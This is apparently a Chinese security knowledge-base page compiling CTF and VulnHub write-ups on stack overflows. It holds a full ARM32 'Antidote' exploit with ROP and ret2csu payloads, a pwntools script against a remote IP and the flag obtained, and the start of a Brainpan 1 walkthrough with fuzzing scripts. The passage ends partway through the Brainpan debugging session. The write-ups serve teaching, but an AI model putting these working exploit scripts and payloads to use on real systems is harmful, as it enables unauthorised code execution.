---
title: 栈与相邻对象覆盖
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/stack/
categories:
- 二进制安全
- 内存破坏
tags:
- 知识库
- 栈溢出
- Shellcode
- Windows
- ARM
- QEMU
- ROP
- ret2csu
- 调试
- 函数指针
- 格式化字符串
- 命令注入
- SSH
description: 覆盖控制数据只是一个阶段，输入长度、坏字符、调用约定和可放置代码的空间决定后续布局。本章保留 Windows、Linux 与 ARM 案例的原始调试输出和最终脚本，按数据如何进入控制流来阅读。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

覆盖控制数据只是一个阶段，输入长度、坏字符、调用约定和可放置代码的空间决定后续布局。本章保留 Windows、Linux 与 ARM 案例的原始调试输出和最终脚本，按数据如何进入控制流来阅读。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/stack/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Brainpan 系列保留偏移、函数指针与多种入口，不能只取最后一份脚本推断全部过程。

BigheadWebSvr 的两篇分析分别使用调试器和静态分析，Egghunter 与分配长度各有对应证据。

Antidote 的 ARM 寄存器传参、Space 的分裂缓冲区以及 Tr0ll-2 的 SUID 环境具有不同约束。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [ARM32 调用约定与 ret2csu](#case-antidote) | antidote | ARM、QEMU、ROP、ret2csu |
| [EIP 偏移、坏字符与 JMP ESP](#case-brainpan-1) | brainpan-1 | 栈溢出、Shellcode、调试 |
| [多个二进制之间的输入边界](#case-brainpan-3) | brainpan-3 | 栈溢出、函数指针、格式化字符串 |
| [popen 解析与间接调用指针](#case-brainpan2) | brainpan2 | 命令注入、栈溢出、SSH |
| [请求处理器中的长度与堆分配](#case-hack-the-box-bigheadwebsvr-2) | hack-the-box-bigheadwebsvr-2 | Windows、堆溢出、IDA |
| [小缓冲区与 Egghunter 布局](#case-hack-the-box-bigheadwebsvr) | hack-the-box-bigheadwebsvr | Windows、Egghunter、Shellcode |
| [分裂缓冲区中的短 shellcode](#case-pwn-space) | pwn-space | 栈溢出、Shellcode、短跳转 |
| [归档材料、Shellshock 与 SUID 溢出](#case-tr0ll-2) | Tr0ll-2 | Shellshock、栈溢出、SUID |

<a id="case-antidote"></a>

## ARM32 调用约定与 ret2csu

分析保留 QEMU 与 gdb-multiarch 的搭建、r0 至 r3 参数传递、libc 地址泄漏和 ARM ret2csu 链。远程版本依赖题目随附的 libc。

<p class="kb-provenance">来源 antidote · 原记录 2021-11-03 · 15 个代码块 · 15 处图片引用</p>

<details class="kb-evidence" id="record-antidote">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start antidote -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# file antidote 
antidote: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 2.6.16, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# checksec antidote
[*] '/root/hackthebox/challenge/pwn/Antidote/antidote'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```



#### 2. General overview:

As can be seen above, the executable has been compiled for ARM processors, and executing it on an x86_64 architecture would normally result in an error telling us that:

***The binary file cannot be executed due to an error in the executable format.***

It is because instructions are encoded differently on these two architectures.

You can bypass this restriction with the [QEMU user-space emulator](https://www.qemu.org/docs/master/user/main.html) which allows you to run binaries for other architectures on our host system.

#### 3. Install needed packages:

I am using Linux Mint 20, but it should work on Ubuntu as well:

``` bash
apt install gcc-arm-linux-gnueabihf binutils-arm-linux-gnueabihf binutils-arm-linux-gnueabihf-dbg gdb-multiarch qemu-user
```

Executing the binary with the [QEMU user emulator](https://www.qemu.org/docs/master/user/main.html) shows another error:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# qemu-arm -L /usr/arm-linux-gnueabihf ./antidote
qemu-arm: Could not open '/lib/ld-linux.so.3': No such file or directory
```

Dynamic linker ld-linux.so.3 is needed, but it is named differently in the arm-linux-gnueabihf directory => (ld-linux-armhf.so.3).

To run binary you could copy this or link it to the /lib/ directory:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# cp /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux.so.3
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# qemu-arm -L /usr/arm-linux-gnueabihf ./antidote
Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!
Come on, hurry up analyzing that bug's DNA! I can't wait to get out of here!
Careful there! That hurt!
```

#### 4. Debugging ARM binaries on X86_64

One of the ways you can debug this binary is to use the qemu-user emulator and tell GDB to connect to it through a TCP port.

To do this, run qemu-arm with the -g flag and a port number on which it should wait for a GDB connection.

The -L flag sets the ELF interpreter prefix to the path you supply.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./antidote
```

Open another terminal window and use the following command:

``` bash
gdb-multiarch -q --nh -ex 'set architecture arm' -ex 'file antidote' -ex 'target remote localhost:1234' -ex 'layout split' -ex 'layout regs'
```

The --nh flag instructs it to not read the .gdbinit file
(it can get buggy if you have a GDB wrapper installed)

The -ex options are the commands we want gdb-multiarch to set at the start of the session.

The first one sets the target architecture to arm
(use arm64 for 64-bit binaries)

Then the binary itself, tell it where to find the binary running in our qemu-arm emulation.

The final two commands are used to split and display the source, disassembly, command, and register windows.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote.jpg)

#### 5. First vulnerability — Buffer overflow:

First, continue the execution in gdb (1).

Generate the de Bruijn sequence using cyclic (2).

Copy-paste the payload (3).

Spot the instruction pointer overflow (4).
(EIP == PC on the ARM arch)

Check the offset (5).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote1.jpg)

#### 6. Control the execution flow:

Restart the binary and attach gdb.

Create an overflow and set the 220–224 bytes to "BBBB" to confirm the Program Counter control.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote2.jpg)

#### 7. Set up ARM environment:

Up to this point, I did everything on my operating system, however, I ran into some debugger configuration issues and I didn't want to make more changes to the host system, this pushed me to use the ready environment prepared by [Maria Markstedter](https://training.azeria-labs.com/about/), available at this [link](https://drive.google.com/file/d/1uX9fRUX-IHitQVD43QUsz9Aocy8pJ8XK/view).

Download the [VMware image](https://drive.google.com/file/d/1uX9fRUX-IHitQVD43QUsz9Aocy8pJ8XK/view).

Mount it.

Start ARM environment as shown below:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote3.jpg)

Copy-paste challenge files to the Virtual Machine

Transfer files to the Raspberry:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote4.jpg)

Test if it works:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote5.jpg)

#### 8. Exploit the binary — bypass NX:

Create test1 file with

``` bash
python -c 'print "A"*220 + "BBBB" + "C"*200' > test1
```

Run the binary in gdb with test1 as an input

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote6.jpg)


Disable ASLR on the Raspberry virtual machine:

``` bash
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

In ARM the first four arguments are passed via r0 to r3 and later arguments are passed through the stack.

In this case, the system function takes one argument as the command to be executed.

To get a shell you need to pass the string "/bin/sh" as the first argument in the register r0 and after that, call the system function.

Below is an example of a buffer overflow scenario with pop {r0, r4, pc} ROP gadget chain.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote7.jpg)

(1) Padding of 220 "A" bytes.

(2) Address of ROP gadget from libc-2.19.so.
(it is libc used on Raspberry for local exploit only)

(3) Pointer to "/bin/sh\x00" string from libc-2.19.so popped into R0.

(4) Random junk-string popped into R4 register.

(5) System address from libc-2.19.so popped into PC.

``` bash
### HOW TO GET THE ADDRESSES:
ROPgadget --binary libc-2.19.so | grep "pop {r0, r4, pc}"
0x0007a12c : pop {r0, r4, pc}
---
strings -t x -a libc-2.19.so| grep "/bin/sh"
11db20 /bin/sh
---
nm -D libc-2.19.so | grep '\<system\>'
00039fac W system
---
python -c 'print "A"*220 + "\x2c\xe1\xeb\xb6" + "\x20\x1b\xf6\xb6" + "A" *4 + "\xac\xdf\xe7\xb6"'  > payload
```

Local code execution:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote8.jpg)

#### 9. Remote exploit — [RET2CSU](https://gbyolo.gitlab.io/posts/2020/07/ret2csu-arm-32bit/):

In order to exploit the "Antidote" remotely, you have to leak the base libc address during binary runtime.

The libc.so.6 library used on the target machine was made available in the challenge package.

To calculate the base libc address, it will be needed to leak __write address from libc.so.6 during binary execution and its dynamic symbol address before execution.

You can utilize the [write(2)](https://man7.org/linux/man-pages/man2/write.2.html) functionality to do that because write() the function can be found within antidote binary which is loaded without any randomization on any system:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote9.jpg)

RET2CSU exploit explained in three gadgets && three steps:

1. Fill R10, R8 and R7 with the three parameters for write() function.
2. Fill R3 with the address of the write() function 0x8420.
3. Utilize 3rd gadget for register swap and branching to the address inside R3.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote10.jpg)

``` bash
### RET2CSU one liner:
python -c 'print "A" *220 + "\x28\x86\x00\x00" + "\x00" * 12 + "\x04\x00\x00\x00" + "\x50\x08\x01\x00" + "\x00" * 4 + "\x01\x00\x00\x00" + "\xcc\x83\x00\x00" + "\x20\x84\x00\x00" + "\xf4\x85\x00\x00"' > payload
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote11.jpg)

Local Proof of concept works on Raspberry Pi.
You can observe a leak of write() from libc loaded during runtime:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote12.jpg)

One last step in order to get the base of libc address is to calculate it by subtracting the __write address from libc.so.6:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# nm -D libc.so.6 | grep "__write"
0008cbc5 W __write@@GLIBC_2.4
```

You can use below script in order to leak and calculate base address of libc:

``` python
from pwn import *

context(arch='arm', bits=32, endian='little')
context.log_level = "debug"

p = remote("138.68.131.63","31250")

pad      = 220 * "A"
csu1     = "\x28\x86\x00\x00"
r4       = "\x00"*4
r5       = "\x00"*4
r6       = "\x00"*4
r7_r2    = "\x04\x00\x00\x00"
r8_r1    = "\x50\x08\x01\x00" 
r9       = "\x00"*4
r10_r0   = "\x01\x00\x00\x00"
csu2     = "\xcc\x83\x00\x00"
r3_write = "\x20\x84\x00\x00"
csu3     = "\xf4\x85\x00\x00"

p.recv()
p.sendline(pad + csu1 + r4 + r5 + r6 + r7_r2 + r8_r1 + r9 + r10_r0 + csu2 + r3_write + csu3)

leak = p.recv()
leaked_write_libc = u32(leak)

print("Leaked write from libc: " + hex(leaked_write_libc))
libc_base = leaked_write_libc - 0x0008cbc5
print("Libc base address: " + hex(libc_base))
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote13.jpg)

#### 10. Remote Code Execution:

There is no ASLR on the remote machine — you can deduce it after running the above script multiple times (Libc base address doesn’t change).

Use the leaked base address of libc to calculate proper addresses of ROP gadget, system() and "/bin/sh" pointer.

First, get the relative addresses:

``` bash
### How to get the address of ROP gadget:
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# ROPgadget --binary libc.so.6 | grep "pop {r0, r4, pc}"
0x0005919c : pop {r0, r4, pc}

### How to get the pointer to "/bin/sh"
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# strings -t x -a libc.so.6| grep "/bin/sh"
  d5f2c /bin/sh

### How to get the system address:
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# nm -D libc.so.6 | grep '\<system\>'
0002d4cd W system@@GLIBC_2.4
```

Then add relative addresses to the leaked address of libc.

Working script with proper calculations, final exploit script:

``` python
from pwn import *

context(arch='arm', bits=32, endian='little')
context.log_level = "debug"

p = remote("138.68.131.63","31250")

padding         = 220 * "A"
base_of_libc    = int(("0xff69f000"),16)
addr_of_rop     = p32(base_of_libc + 0x0005919c)
addr_bin_sh     = p32(base_of_libc + 0xd5f2c)
junk_for_r4     = 4 * "\x00"
addr_system     = p32(base_of_libc + 0x0002d4cd)

p.sendline(padding + addr_of_rop + addr_bin_sh + junk_for_r4 + addr_system)
p.recv()

p.interactive()
```

Run it against the remote target:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Antidote]
└─# python finalexp.py
[+] Opening connection to 138.68.131.63 on port 31250: Done
[DEBUG] Sent 0xed bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000d0  41 41 41 41  41 41 41 41  41 41 41 41  9c 81 6f ff  │AAAA│AAAA│AAAA│··o·│
    000000e0  2c 4f 77 ff  00 00 00 00  cd c4 6c ff  0a           │,Ow·│····│··l·│·│
    000000ed
[DEBUG] Received 0x98 bytes:
    'Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!\n'
    "Come on, hurry up analyzing that bug's DNA! I can't wait to get out of here!\n"
    'Careful there! That hurt!\n'
[*] Switching to interactive mode
$ cat /home/ctf/flag.txt
[DEBUG] Sent 0x17 bytes:
    'cat /home/ctf/flag.txt\n'
[DEBUG] Received 0x3d bytes:
    'HTB{Th4nk_y0u_f0r_h3lp1ng_m3_w1th_th4t_bug!Y0u_s4ved_my_arm}\n'
HTB{Th4nk_y0u_f0r_h3lp1ng_m3_w1th_th4t_bug!Y0u_s4ved_my_arm}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/antidote14.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Antidote — HTB](https://karol-mazurek95.medium.com/pwn-antidote-htb-8293082bc985)
<!-- kb:end antidote -->

</details>

<a id="case-brainpan-1"></a>

## EIP 偏移、坏字符与 JMP ESP

从模糊测试到 cyclic 偏移确认，再将跳转地址、NOP 区和 shellcode 拼接为原有载荷。Wine 与 Windows 的调试现象、man 提权也保留。

<p class="kb-provenance">来源 brainpan-1 · 原记录 2020-01-26 · 24 个代码块 · 12 处图片引用</p>

<details class="kb-evidence" id="record-brainpan-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start brainpan-1 -->

#### 名称
名称：Brainpan: 1
发布日期：2013年3月20日

#### 下载

 - Download (Mirror): https://download.vulnhub.com/brainpan/Brainpan.zip
 - Download (Torrent): https://download.vulnhub.com/brainpan/Brainpan.zip.torrent

#### 描述

``` bash
 _               _                         
| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  
| '_ \| '__/ _` | | '_ \| '_ \ / _` | '_ \ 
| |_) | | | (_| | | | | | |_) | (_| | | | |
|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|
                        |_|                
                            by superkojiman  
                 http://www.techorganic.com
```

#### 免责声明

使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。
TL; DR：如果发生坏事，这不是我的错。

#### 设定

Brainpan经过测试，发现可在以下虚拟机监控程序上工作：
-VMware Player 5.0.1
-VMWare Fusion 5.0
-VirtualBox 4.2.8
将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。

资料来源：Brainpan.zip/readme.txt

``` bash
MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4
```
资料来源：Brainpan.zip/md5.txtVulnHub独家！



#### 信息收集

nmap扫一顿

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.115
Host is up (0.00042s latency).
MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)

root@kali:~# nmap -p- -v -Pn -sV 192.168.56.115
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

访问一下看看是什么东西:

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg)


扫一下目录看看

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg)

在bin目录中有一个二进制文件？

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg)

将这个exe文件下载下来，然后用ollydbug工具调试

调试之前，先分析下brainpan.exe

``` bash
root@kali:~/vulnhub/brainpan1# file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
root@kali:~/vulnhub/brainpan1# strings brainpan.exe 
!This program cannot be run in DOS mode.
.text
`.data
.rdata
@.bss
.idata
[^_]
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
[^_]
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          >> 
                          ACCESS DENIED
                          ACCESS GRANTED
[+] initializing winsock...
[!] winsock init failed: %d
done.
[!] could not create socket: %d
[+] server socket created.
[!] bind failed: %d
[+] bind done on port %d
[+] waiting for connections.
[+] received connection.
[+] check is %d
[!] accept failed: %d
[+] cleaning up.
-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32
w32_sharedptr->size == sizeof(W32_EH_SHARED)
../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c
GetAtomNameA (atom, s, sizeof(s)) != 0
AddAtomA
ExitProcess
FindAtomA
GetAtomNameA
SetUnhandledExceptionFilter
__getmainargs
__p__environ
__p__fmode
__set_app_type
_assert
_cexit
_iob
_onexit
_setmode
abort
atexit
free
malloc
memset
printf
signal
strcmp
strcpy
strlen
太多了省略。。。
```

这里有几个很重要：

 - 这个brainpan.exe看起来与端口9999上的侦听过程相同
 - shitstorm 看起来像密码
 - strcpy 可能是缓冲区溢出攻击向量

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg)

显然，应该尝试可能的密码shitstorm。

``` bash
root@kali:~# nc 192.168.56.115 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED
```

返回。
嗯...如何检查strcpy函数。
虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。

免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。

是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。


etfuzz.py

``` bash
import sys,socket
 
victim = '192.168.56.115'
port = 9999
 
junk = "\x41" * 1000
 
payload = junk 
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
```

是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。

``` bash
C:\Users\HASEE\Desktop\brainpan1>python etfuzz.py
[-] Connecting to 192.168.43.98
[-] Sending payload....  Done
```

``` bash
C:\Users\HASEE\Desktop\brainpan1>brainpan.exe
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.
[+] received connection.
[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(_]
[get_reply] copied 1003 bytes to buffer
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg)

AM！造成了我们想要的段错误，所见，已经成功地使用模糊A覆盖了eip。是时候控制自己，享受一些乐趣了。
下一步，需要多少字节来填充缓冲区以使eip？使用Metasploit的工具进行此活动。创建一个模式作为开始。

``` bash
root@kali:~/vulnhub/brainpan1# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

将其添加到模糊测试脚本etfuzz.py中，用模式输出替换掉A的垃圾数据。

``` bash
import sys,socket
 
victim = '192.168.43.98'
port = 9999
 
junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
 
payload = junk 
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
```

下一步。重新启动brainpan.exe进程，重新附加到进程，然后将模糊测试脚本发送给侦听器。

``` bash
C:\Users\HASEE\Desktop\brainpan1>python etfuzz.py
[-] Connecting to 192.168.43.98
[-] Sending payload....  Done
```

``` bash
C:\Users\HASEE\Desktop\brainpan1>brainpan.exe
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.
[+] received connection.
